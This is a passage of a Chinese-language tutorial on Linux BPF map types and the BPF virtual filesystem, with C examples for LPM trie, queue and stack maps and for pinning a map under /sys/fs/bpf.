class="line">bpf_get_current_comm(&amp;data.program_name, <span class="keyword">sizeof</span>(data.program_name)); </span><br><span class="line">  bpf_perf_event_output(ctx, &amp;events, <span class="number">0</span>, &amp;data, <span class="keyword">sizeof</span>(data));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在此代码段中，我们使用<code>bpf_perf_event_output</code>将数据附着到<code>map</code>中。 因为这是一个实时缓冲区，所以你不必担心<code>map</code>中元素的键，内核负责将新元素添加到<code>map</code>并在用户空间程序处理它后刷新它。</p><h4 id="Per-CPU哈希映射"><a href="#Per-CPU哈希映射" class="headerlink" title="Per-CPU哈希映射"></a>Per-CPU哈希映射</h4><p>这种类型的映射是<code>BPF_MAP_TYPE_HASH</code>的改进版本。 这些映射使用<code>BPF_MAP_TYPE_PERCPU_HASH</code>类型定义。 当你分配其中一个映射时，每个CPU都会看到它自身隔离版本的映射，这使得高性能查找和聚合更加高效。 如果你的BPF程序收集指标并将它们聚合到哈希表映射中，使用这种类型的映射就很有用。</p><h4 id="Per-CPU数组映射"><a href="#Per-CPU数组映射" class="headerlink" title="Per-CPU数组映射"></a>Per-CPU数组映射</h4><p>这种类型的地图也是<code>BPF_MAP_TYPE_ARRAY</code>的改进版本。 它们使用<code>BPF_MAP_TYPE_PERCPU_ARRAY</code>类型定义。</p><h4 id="堆栈跟踪映射"><a href="#堆栈跟踪映射" class="headerlink" title="堆栈跟踪映射"></a>堆栈跟踪映射</h4><p>这种类型的映射存储正在运行的进程的堆栈跟踪。 它们使用<code>BPF_MAP_TYPE_STACK_TRACE</code>类型定义。 除了这个映射，内核开发人员已经添加了帮助程序<code>bpf_get_stackid</code>来帮助你使用堆栈跟踪填充这个映射。此帮助程序将映射作为参数和一系列标志，以便你可以指定是否只需要来自内核、只来自用户空间或两者的跟踪。帮助器返回与添加到<code>map</code>中的元素关联的键。</p><h4 id="Cgroup数组映射"><a href="#Cgroup数组映射" class="headerlink" title="Cgroup数组映射"></a>Cgroup数组映射</h4><p>这种类型的映射存储对<code>cgroups</code>的引用。<code>Cgroup</code>数组映射使用<code>BPF_MAP_TYPE_CGROUP_ARRAY</code>类型定义。 本质上，它们的行为类似于<code>BPF_MAP_TYPE_PROG_ARRAY</code>，但它们存储指向<code>cgroup</code>的文件描述符标识符。</p><p>当你希望在<code>BPF map</code>之间共享<code>cgroup</code>引用以控制流量、调试和测试时，该映射会非常有用。 让我们看一个如何填充此映射的示例。 我们从映射定义开始：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> cgroups_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_CGROUP_ARRAY, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>),</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>), </span><br><span class="line">  .max_entries = <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们可以通过打开包含<code>cgroup</code>信息的文件来拿到<code>cgroup</code>的文件描述符。 我们将打开控制<code>Docker</code>容器的基本CPU额度的<code>cgroup</code>，并将该<code>cgroup</code>存储在我们的映射中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> cgroup_fd, key = <span class="number">0</span>;</span><br><span class="line">cgroup_fd = open(<span class="string">"/sys/fs/cgroup/cpu/docker/cpu.shares"</span>, O_RDONLY);</span><br><span class="line">bpf_update_elem(&amp;cgroups_map, &amp;key, &amp;cgroup_fd, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h4 id="LRU哈希和Per-CPU哈希映射"><a href="#LRU哈希和Per-CPU哈希映射" class="headerlink" title="LRU哈希和Per-CPU哈希映射"></a>LRU哈希和Per-CPU哈希映射</h4><p>这两种类型的映射是哈希表映射，但它们也实现了内部LRU缓存。 LRU代表最近最少使用，这意味着如果映射已满，这些映射将删除不经常使用的元素，以便为映射中的新元素腾出空间。 因此，你可以使用这些映射来插入超出最大限制的元素，只要不介意丢失最近未使用的元素。 它们使用<code>BPF_MAP_TYPE_LRU_HASH</code>和<code>BPF_MAP_TYPE_LRU_PERCPU_HASH</code>类型定义。</p><p>此映射的<code>per cpu</code>版本与之前看到的其他<code>per cpu</code>映射略有不同。 该映射只保留一个哈希表来存储映射中的所有元素，并且每个CPU使用不同的LRU缓存，这样可以确保每个CPU中最常用的元素保留在映射中。</p><h4 id="LPM-Trie映射"><a href="#LPM-Trie映射" class="headerlink" title="LPM Trie映射"></a>LPM Trie映射</h4><p><code>LPM trie</code>映射是使用最长前缀匹配(LPM)来查找映射中元素的映射类型。LPM是一种算法，它从树中的任何其他匹配项中选择与最长查找键匹配的元素。此算法用于保留流量转发表以将IP地址与特定路由的路由器和其他设备进行匹配。 这些映射使用<code>BPF_MAP_TYPE_LPM_TRIE</code>类型定义。</p><p>这些映射要求<code>key</code>的大小为8的倍数，范围为8到2048。 如果你不想实现自己的<code>key</code>，内核提供了一个结构体，可以将其用于这些<code>keys</code>，称为<code>bpf_lpm_trie_key</code>。</p><p>在下一个示例中，我们将两个转发路由添加到映射并尝试将IP地址匹配到正确的路由。 首先我们需要创建映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> routing_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_LPM_TRIE,</span><br><span class="line">.key_size = <span class="number">8</span>,</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>), </span><br><span class="line">  .max_entries = <span class="number">10000</span>,</span><br><span class="line">  .map_flags = BPF_F_NO_PREALLOC,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们将使用三个转发路由填充此映射: <code>192.168.0.0/16、192.168.0.0/24 和 192.168.1.0/24</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> value_1 = <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_lpm_trie_key</span> <span class="title">route_1</span> = &#123;</span>.data = &#123;<span class="number">192</span>, <span class="number">168</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, .prefixlen = <span class="number">16</span>&#125;; </span><br><span class="line"><span class="keyword">uint64_t</span> value_2 = <span class="number">2</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_lpm_trie_key</span> <span class="title">route_2</span> = &#123;</span>.data = &#123;<span class="number">192</span>, <span class="number">168</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, .prefixlen = <span class="number">24</span>&#125;; </span><br><span class="line"><span class="keyword">uint64_t</span> value_3 = <span class="number">3</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_lpm_trie_key</span> <span class="title">route_3</span> = &#123;</span>.data = &#123;<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, .prefixlen = <span class="number">24</span>&#125;;</span><br><span class="line">bpf_map_update_elem(&amp;routing_map, &amp;route_1, &amp;value_1, BPF_ANY);</span><br><span class="line">bpf_map_update_elem(&amp;routing_map, &amp;route_2, &amp;value_2, BPF_ANY);</span><br><span class="line">bpf_map_update_elem(&amp;routing_map, &amp;route_3, &amp;value_3, BPF_ANY);</span><br></pre></td></tr></table></figure><p>现在，我们使用相同的<code>keys</code>结构来查找IP地址<code>192.168.1.1/32</code>的正确匹配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> result;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_lpm_trie_key</span> <span class="title">lookup</span> = &#123;</span>.data = &#123;<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>&#125;, .prefixlen = <span class="number">32</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> ret = bpf_map_lookup_elem(&amp;routing_map, &amp;lookup, &amp;result); </span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, result);</span><br></pre></td></tr></table></figure><p>在此示例中，<code>192.168.0.0/16</code>和<code>192.168.1.0/24</code>都可以匹配查找IP，因为该IP都在这两个范围内。 但是，由于该映射使用LPM 算法，结果将填充键为<code>192.168.1.0/24</code>的值。</p><h4 id="数组映射和哈希映射"><a href="#数组映射和哈希映射" class="headerlink" title="数组映射和哈希映射"></a>数组映射和哈希映射</h4><p><code>BPF_MAP_TYPE_ARRAY_OF_MAPS</code>和<code>BPF_MAP_TYPE_HASH_OF_MAPS</code>是存储对其它映射的引用的两种类型的映射。 它们仅支持一级间接引用，因此不能使用它们来存储映射的映射的映射。 这可确保不会因意外存储无限链式映射而消耗所有内存。</p><p>当你希望在运行时替换整个映射时，这些类型的映射很有用。 如果你的所有映射都是全局映射的子集，那么可以创建全状态快照。 内核确保父映射中的任何更新操作都等到所有旧的子映射的引用都被删除后才完成操作。</p><h4 id="Device-Map映射"><a href="#Device-Map映射" class="headerlink" title="Device Map映射"></a>Device Map映射</h4><p>这种特殊类型的映射存储对网络设备的引用。这些映射使用<code>BPF_MAP_TYPE_DEVMAP</code>类型定义。 它们对想在内核级别操纵流量的网络应用程序很有用。你可以构建指向特定网络设备的端口虚拟映射，然后使用帮助器<code>bpf_redirect_map</code>重定向数据包。</p><h4 id="CPU-Map映射"><a href="#CPU-Map映射" class="headerlink" title="CPU Map映射"></a>CPU Map映射</h4><p><code>BPF_MAP_TYPE_CPUMAP</code>是另一种允许转发网络流量的映射。在这种情况下，映射存储对主机中不同CPU的引用。 与之前的映射类型一样，你可以将其与<code>bpf_redirect_map</code>帮助程序一起使用来重定向数据包。但是，此映射将数据包发送到不同的CPU。这允许将特定CPU分配给网络堆栈以实现可扩展性和隔离目的。</p><h4 id="Open-Socket映射"><a href="#Open-Socket映射" class="headerlink" title="Open Socket映射"></a>Open Socket映射</h4><p><code>BPF_MAP_TYPE_XSKMAP</code>是一种存储对打开套接字的引用的映射。 与之前的映射一样，这些映射对于套接字之间转发数据包很有用。</p><h4 id="Socket-Array和Hash映射"><a href="#Socket-Array和Hash映射" class="headerlink" title="Socket Array和Hash映射"></a>Socket Array和Hash映射</h4><p><code>BPF_MAP_TYPE_SOCKMAP</code>和<code>BPF_MAP_TYPE_SOCKHASH</code>是两个专门的映射，它们存储对内核中打开套接字的引用。 与前面的映射一样，这种类型的映射与帮助程序<code>bpf_redirect_map</code>一起使用，将套接字缓冲区从当前XDP程序转发到不同的套接字。</p><p>它们的主要区别在于其中一个使用数组来存储套接字，而另一个使用哈希表。使用哈希表的好处是你可以直接通过它的键访问一个套接字，而不需要遍历完整的映射来找到它。内核中的每个套接字都由一个五元组键标识。 这五个元组包含建立双向网络连接所需的信息。 当使用此映射的哈希表版本时，你可以将此键用作映射中的查找键。</p><h4 id="Cgroup-Storage-and-Per-CPU-Storage映射"><a href="#Cgroup-Storage-and-Per-CPU-Storage映射" class="headerlink" title="Cgroup Storage and Per-CPU Storage映射"></a>Cgroup Storage and Per-CPU Storage映射</h4><p>引入这两种类型的映射是为了帮助开发人员使用附着到<code>cgroup</code>的BPF程序。 你可以将BPF程序与控制组连接和分离，并使用<code>BPF_PROG_TYPE_CGROUP_SKB</code>将它们的运行时隔离到特定的<code>cgroup</code>。 这两个映射使用 <code>BPF_MAP_TYPE_CGROUP_STORAGE</code>和<code>BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE</code>类型定义。</p><p>从开发人员的角度来看，这些类型的映射类似于哈希表映射。内核提供了一个结构助手来为这个映射生成键，<code>bpf_cgroup_storage_key</code>，其中包括有关<code>cgroup</code>节点标识符和附加类型的信息。 你可以在此映射中添加任何想要的值，它的访问权限将仅限于附加<code>cgroup</code>内的BPF程序。</p><p>这些映射有两个限制。首先是你不能从用户空间在映射中创建新元素。内核中的BPF程序可以使用<code>bpf_map_update_elem</code>创建元素，但是如果你在用户空间使用此方法并且<code>key</code>不存在，则    <code>bpf_map_update_elem</code>将失败，并且<code>errno</code>将被设置为<code>ENOENT</code>。 第二个限制是你不能从此映射中删除元素。<code>bpf_map_delete_elem</code>总是失败并将<code>errno</code>设置为<code>EINVAL</code>。</p><p>这两种类型的映射之间的主要区别是<code>BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE</code>为每个CPU保留不同的哈希表。</p><h4 id="Reuseport-Socket映射"><a href="#Reuseport-Socket映射" class="headerlink" title="Reuseport Socket映射"></a>Reuseport Socket映射</h4><p>这种特殊类型的映射存储对系统中的开放端口重用的套接字的引用。它们使用<code>BPF_MAP_TYPE_REUSE PORT_SOCKARRAY</code>类型定义。这些映射主要用于<code>BPF_PROG_TYPE_SK_REUSEPORT</code>程序类型。 结合起来，你可以控制决定如何过滤和处理来自网络设备的传入数据包。例如，可以决定哪些数据包发送到哪个套接字，即使两个套接字都连接到同一个端口。</p><h4 id="Queue映射"><a href="#Queue映射" class="headerlink" title="Queue映射"></a>Queue映射</h4><p>队列映射使用先进先出(FIFO)存储将元素保留在映射中。它们使用<code>BPF_MAP_TYPE_QUEUE</code>类型定义。FIFO意味着当从映射中获取元素时，结果将是映射中存在时间最长的元素。</p><p>对于这种数据结构，bpf映射帮助器以一种可预测的方式工作。当使用<code>bpf_map_lookup_elem</code>时，此映射始终在映射中查找最旧的元素。 当使用<code>bpf_map_update_elem</code>时，此映射始终将元素附加到队列的末尾，因此你需要先读取映射中的其余元素，然后才能获取此元素。 当然你还可以使用帮助程序<code>bpf_map_lookup_and_delete</code>获取较旧的元素并以原子方式将其从映射中删除。此映射不支持帮助函数<code>bpf_map_delete_elem</code>和<code>bpf_map_get_next_key</code>。 如果尝试使用它们，它们将失败并将<code>errno</code>变量设置为<code>EINVAL</code>。</p><p>关于这些类型的映射，需要记住的是它们不使用映射键进行查找，并且在初始化这些映射时键大小必须始终为 0。 当你将元素推送到这些映射时，键必须是空值。</p><p>接下来看一个如何使用这类映射的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> queue_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_QUEUE,</span><br><span class="line">.key_size = <span class="number">0</span>,</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">  .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着我们在这个映射中插入几个元素，并按照我们插入的顺序检索它们：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i; </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">  bpf_map_update_elem(&amp;queue_map, <span class="literal">NULL</span>, &amp;i, BPF_ANY);</span><br><span class="line"><span class="keyword">int</span> value; </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">  bpf_map_lookup_and_delete(&amp;queue_map, <span class="literal">NULL</span>, &amp;value);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Value read from the map: '0'</span><br><span class="line">Value read from the map: '1'</span><br><span class="line">Value read from the map: '2'</span><br><span class="line">Value read from the map: '3'</span><br><span class="line">Value read from the map: '4'</span><br></pre></td></tr></table></figure><p>如果我们再尝试从映射中弹出一个新元素，<code>bpf_map_lookup_and_delete</code>将返回一个负数，并且<code>errno</code>变量将设置为<code>ENOENT</code>。</p><h4 id="Stack映射"><a href="#Stack映射" class="headerlink" title="Stack映射"></a>Stack映射</h4><p>堆栈映射使用先进后出 (FILO)存储将元素保留在映射中。 它们使用<code>BPF_MAP_TYPE_STACK</code>类型定义。 FILO意味着当你从映射中获取元素时，结果将是最近添加到映射中的元素。</p><p>对于这种数据结构，bpf映射助手也以可预测的方式工作。当你使用<code>bpf_map_lookup_elem</code>时，此映射总是寻找最新的元素。当你使用<code>bpf_map_update_elem</code>时，此映射始终将元素附加到堆栈顶部，因此它是第一个获取的元素。你还可以使用帮助程序<code>bpf_map_lookup_and_delete</code>获取最新元素并以原子方式将其从映射中删除。此映射不支持帮助函数<code>bpf_map_delete_elem</code>和<code>bpf_map_get_next_key</code>。 如果你尝试使用它们，它们将始终失败并将 <code>errno</code>变量设置为<code>EINVAL</code>。</p><p>接下来看一个如何使用这类映射的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> stack_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_STACK,</span><br><span class="line">.key_size = <span class="number">0</span>,</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">  .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着我们在这个映射中插入几个元素，并按照我们插入的顺序检索它们：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i; </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">  bpf_map_update_elem(&amp;stack_map, <span class="literal">NULL</span>, &amp;i, BPF_ANY);</span><br><span class="line"><span class="keyword">int</span> value; </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">  bpf_map_lookup_and_delete(&amp;stack_map, <span class="literal">NULL</span>, &amp;value);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Value read from the map: '4'</span><br><span class="line">Value read from the map: '3'</span><br><span class="line">Value read from the map: '2'</span><br><span class="line">Value read from the map: '1'</span><br><span class="line">Value read from the map: '0'</span><br></pre></td></tr></table></figure><p>如果我们再尝试从映射中弹出一个新元素，<code>bpf_map_lookup_and_delete</code>将返回一个负数，并且<code>errno</code>变量将设置为<code>ENOENT</code>。</p><p>正如我们前面提到的，BPF映射作为常规文件存储在你的操作系统中。但是我们还没有讨论内核用来保存映射和程序的文件系统的具体特征。下一部分将介绍BPF文件系统，以及可以从中获得的持久性类型。</p><h3 id="BPF虚拟文件系统"><a href="#BPF虚拟文件系统" class="headerlink" title="BPF虚拟文件系统"></a>BPF虚拟文件系统</h3><p>BPF映射的一个基本特征是基于文件描述符，这意味着当一个描述符关闭时，映射和它所保存的所有信息都会消失。BPF映射的最初实现专注于时间短且隔离的程序，它们之间不共享任何信息。在这些情况下，当文件描述符关闭时擦除所有数据很有意义。然而，随着内核中引入更复杂的映射和集成，其开发人员意识到他们需要一种方法来保存映射所持有的信息，即使在程序终止并关闭映射的文件描述符之后也是如此。Linux内核<code>4.4</code>版引入了两个新的系统调用，允许从虚拟文件系统固定和获取映射和BPF程序。 固定到该文件系统的Map和BPF程序将在创建它们的程序终止后保留在内存中。 在本节中，我们将解释如何使用这个虚拟文件系统。</p><p>BPF虚拟文件系统的默认目录是<code>/sys/fs/bpf</code>，一些Linux发行版默认不挂载这个文件系统，因为它们假设内核不支持BPF。你可以使用<code>mount</code>命令自行挂载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t bpf /sys/fs/bpf /sys/fs/bpf</span><br></pre></td></tr></table></figure><p>与其他文件层次结构一样，文件系统中的BPF持久化对象由路径标识。你可以以任何方式组织这些路径使得程序有意义。例如，如果你想在程序之间共享带有IP信息的特定映射，你可以将其存储在<code>/sys/fs/bpf/shared/ips</code>中。正如我们前面提到的，有两种类型的对象可以保存在这个文件系统中：BPF映射和完整的BPF程序。这两者都由文件描述符标识，因此使用它们的接口是相同的。 这些对象只能由bpf系统调用操作。 尽管内核提供了高级助手来帮助你与它们交互，但是不能做诸如尝试使用<code>open</code>系统调用打开这些文件之类的操作。</p><p><code>BPF_PIN_FD</code>是在这个文件系统中保存BPF对象的命令。当命令成功时，该对象将在你指定的路径中的文件系统中可见。如果命令失败，则返回一个负数，并使用错误代码设置全局<code>errno</code>变量。</p><p><code>BPF_OBJ_GET</code>是获取已固定到文件系统的BPF对象的命令。 此命令使用你分配的对象路径来加载它。 当此命令成功时，它会返回与对象关联的文件描述符标识符。 如果失败，则返回一个负数，并使用特定的错误代码设置全局errno变量。</p><p>让我们看一个例子，说明如何使用内核提供的辅助函数在不同的程序中利用这两个命令。首先，我们要编写一个程序来创建一个映射，用几个元素填充它，并将它保存在文件系统中：</p><p><code>map_pinning_save.c</code>程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"bpf.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *file_path = <span class="string">"/sys/fs/bpf/my_array"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> key, value, fd, added, pinned;</span><br><span class="line"></span><br><span class="line">  fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to create map: %d (%s)\n"</span>, fd, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  key = <span class="number">1</span>, value = <span class="number">1234</span>;</span><br><span class="line">  added = bpf_map_update_elem(fd, &amp;key, &amp;value, BPF_ANY);</span><br><span class="line">  <span class="keyword">if</span> (added &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to update map: %d (%s)\n"</span>, added, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  pinned = bpf_obj_pin(fd, file_path);</span><br><span class="line">  <span class="keyword">if</span> (pinned &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to pin map to the file system: %d (%s)\n"</span>, pinned,</span><br><span class="line">           strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，我们创建一个固定大小元素的哈希表映射。 然后我们更新映射以仅添加该元素。 如果我们尝试添加更多元素，<code>bpf_map_update_elem</code>将会失败，因为映射会溢出。</p><p>我们使用辅助函数<code>bpf_obj_pin</code>将映射保存在文件系统中。 </p><p><code>Makefile</code>程序如下</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">CLANG = clang</span><br><span class="line"></span><br><span class="line">INCLUDE_PATH += -I/root/linux-5.4/tools/lib/bpf</span><br><span class="line"></span><br><span class="line">LIBRARY_PATH = -L/usr/local/lib64</span><br><span class="line">BPFSO = -lbpf</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>: clean </span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -f fetch save</span><br><span class="line"></span><br><span class="line"><span class="section">fetch: map_pinning_fetch.c </span></span><br><span class="line">clang -o fetch -lelf <span class="variable">$(INCLUDE_PATH)</span> <span class="variable">$(LIBRARY_PATH)</span> <span class="variable">$(BPFSO)</span> <span class="variable">$?</span></span><br><span class="line"></span><br><span class="line"><span class="section">save: map_pinning_save.c</span></span><br><span class="line">clang -o save -lelf <span class="variable">$(INCLUDE_PATH)</span> <span class="variable">$(LIBRARY_PATH)</span> <span class="variable">$(BPFSO)</span> <span class="variable">$?</span></span><br><span class="line"></span><br><span class="line"><span class="section">build: fetch save</span></span><br><span class="line"></span><br><span class="line">.DEFAULT_GOAL := build</span><br></pre></td></tr></table></figure><p>执行程序前查看<code>/sys/fs/bpf</code>路径下的目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt2]# ls -la /sys/fs/bpf/</span><br><span class="line">total 0</span><br><span class="line">drwx-----T 2 root root 0 May 16 20:00 .</span><br><span class="line">drwxr-xr-x 6 root root 0 May 16 20:00 ..</span><br></pre></td></tr></table></figure><p>开始执行该程序</p><p>第一步执行<code>make save</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt2]# make save</span><br><span class="line">clang -o save -lelf -I/root/linux-5.4/tools/lib/bpf -L/usr/local/lib64 -lbpf map_pinning_save.c</span><br></pre></td></tr></table></figure><p>第二步执行生成的可执行文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 